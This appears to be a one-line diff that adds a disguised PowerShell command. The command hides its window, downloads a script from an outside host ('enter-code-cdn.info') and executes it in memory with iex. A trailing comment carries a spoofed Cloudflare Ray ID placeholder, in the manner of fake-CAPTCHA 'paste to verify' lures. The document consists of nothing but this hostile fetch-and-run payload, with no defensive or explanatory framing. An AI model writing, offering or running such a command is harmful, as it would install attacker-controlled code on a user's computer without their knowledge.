@@ -1,0 +1,1 @@
+powershell -w h "iex(irm 'enter-code-cdn.info/<16hex>' -UseBasicParsing)"; exit <#<spoofed-CF-RayID>#>
